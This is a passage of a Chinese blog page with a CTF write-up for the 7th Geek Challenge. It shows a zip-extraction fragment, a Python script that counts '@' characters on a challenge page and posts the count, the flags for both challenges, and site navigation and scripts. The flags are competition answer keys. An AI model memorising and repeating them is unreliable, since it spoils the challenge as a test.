class="line">        zip = zipfile.ZipFile(path)</div><div class="line">        zip.extractall(&quot;/root/rcoil/&quot;)</div><div class="line">    except:</div><div class="line">        pass</div></pre></td></tr></table></figure></p>
+<p>刚开始不知道是几个格式。<br>flag：SYC{c0Mp4esS_666_3o_O}</p>
+<h3 id="单身二十年，手速一定快-score-200"><a href="#单身二十年，手速一定快-score-200" class="headerlink" title="单身二十年，手速一定快(score:200)"></a>单身二十年，手速一定快(score:200)</h3><p><a href="http://web.sycsec.com/0b3a7c6ca7f1f2e6/" target="_blank" rel="external">http://web.sycsec.com/0b3a7c6ca7f1f2e6/</a> 狗师傅说这道题要跑跑脚本呢:) 跑出后找qq:3245037532 推荐一下python学习链接啦:)<a href="http://pan.baidu.com/s/1hsdTlgo" target="_blank" rel="external">http://pan.baidu.com/s/1hsdTlgo</a></p>
+<p>解法：Isron同学的脚本借鉴<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">s=requests.session()</div><div class="line">url=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/&apos;</div><div class="line">url2=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/judge.php&apos;</div><div class="line">qqq=s.get(url).content #通过requests获取到网页源代码</div><div class="line">a = qqq.count(&apos;@&apos;)-1   #利用count计数器获取@值</div><div class="line">post = &#123;&apos;mytext&apos;:a&#125;    #构造post数据</div><div class="line">q = s.post(url2,data=post) #上传post数据到url2</div><div class="line">print q.content.decode(&apos;utf-8&apos;) #输出返回值</div></pre></td></tr></table></figure></p>
+<p>flag：SYC{web_is_fun}</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://ooo.0o0.ooo/2017/04/12/58ee21687d335.png" alt="RcoIl WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      RcoIl
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://rcoil.me/2016/10/第七届极客大挑战/" title="第七届极客大挑战">http://rcoil.me/2016/10/第七届极客大挑战/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> Writeup</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/MySQL问题/" rel="next" title="MySQL问题">
+                <i class="fa fa-chevron-left"></i> MySQL问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/图片转字符画/" rel="prev" title="Python-图片转字符画">
+                Python-图片转字符画 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODE5NS80NzY4"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="RcoIl" />
+          <p class="site-author-name" itemprop="name">RcoIl</p>
+           
+              <p class="site-description motion-element" itemprop="description">好吃懒做，还有就是皮肤比黄皮果还黄！</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/RcoIl" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rcoil@qq.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-fa fa-envelope-open"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn/" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kerlinglovsec.lofter.com/" title="kerling" target="_blank">kerling</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.agteam.net/" title="Fire-ant" target="_blank">Fire-ant</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xnianq.cn/" title="xniang" target="_blank">xniang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one/" title="nMask" target="_blank">nMask</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-1-score-50"><span class="nav-number">1.1.</span> <span class="nav-text">web_1(score:50)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-2-score-50"><span class="nav-number">1.2.</span> <span class="nav-text">web_2(score:50)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Social-Engineering-score-200"><span class="nav-number">1.3.</span> <span class="nav-text">Social Engineering(score:200)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli1-score-100"><span class="nav-number">1.4.</span> <span class="nav-text">sqli1(score:100)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli2-score-150"><span class="nav-number">1.5.</span> <span class="nav-text">sqli2(score:150)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#127-0-0-x-score-200"><span class="nav-number">1.6.</span> <span class="nav-text">127.0.0.x(score:200)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-is-fun-score-200"><span class="nav-number">1.7.</span> <span class="nav-text">php_is_fun(score:200)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#撸啊撸-score-300"><span class="nav-number">1.8.</span> <span class="nav-text">撸啊撸(score:300)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#皓宝宝的留言板-score-150"><span class="nav-number">1.9.</span> <span class="nav-text">皓宝宝的留言板(score:150)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#人生苦短-score-150"><span class="nav-number">1.10.</span> <span class="nav-text">人生苦短(score:150)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#狗师傅的计算器-score-200"><span class="nav-number">1.11.</span> <span class="nav-text">狗师傅的计算器(score:200)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Only-number-never-lies-to-you-score-250"><span class="nav-number">1.12.</span> <span class="nav-text">Only number never lies to you(score:250)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传-1-score-100"><span class="nav-number">1.13.</span> <span class="nav-text">上传(1)(score:100)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传-2-score-100"><span class="nav-number">1.14.</span> <span class="nav-text">上传(2)(score:100)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你是人间四月天-score-150"><span class="nav-number">1.15.</span> <span class="nav-text">你是人间四月天(score:150)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到题-score-10"><span class="nav-number">2.1.</span> <span class="nav-text">签到题(score:10)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xiao彩蛋-√已完成"><span class="nav-number">2.2.</span> <span class="nav-text">xiao彩蛋(√已完成)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#闪的好快-score-150"><span class="nav-number">2.3.</span> <span class="nav-text">闪的好快(score:150)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Come-game-score-50"><span class="nav-number">2.4.</span> <span class="nav-text">Come_game(score:50)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#旋转跳跃-score-100"><span class="nav-number">2.5.</span> <span class="nav-text">旋转跳跃(score:100)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#凯撒部长的奖励-√已完成"><span class="nav-number">2.6.</span> <span class="nav-text">凯撒部长的奖励(√已完成)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5cracker-score-50"><span class="nav-number">2.7.</span> <span class="nav-text">MD5cracker(score:50)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PEN-AND-APPLE（分数：150）-√已完成"><span class="nav-number">2.8.</span> <span class="nav-text">PEN_AND_APPLE（分数：150）(√已完成)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#藏着小秘密的流量包（分数：200）"><span class="nav-number">2.9.</span> <span class="nav-text">藏着小秘密的流量包（分数：200）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">3.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Program"><span class="nav-number">4.</span> <span class="nav-text">Program</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#compress300-score-250"><span class="nav-number">4.1.</span> <span class="nav-text">compress300(score:250)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单身二十年，手速一定快-score-200"><span class="nav-number">4.2.</span> <span class="nav-text">单身二十年，手速一定快(score:200)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+<!--
+    <i class="fa fa-heart"></i>
+-->
+	<i class="fa fa-address-card-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RcoIl</span>
+</div>
+<!--
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-blind" aria-hidden="true"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-user-md" aria-hidden="true"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KVNdpVifyFqJPx0bzSg6cN7z-gzGzoHsz", "vlNRwqLbdUTKC1W06gjYj0iG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
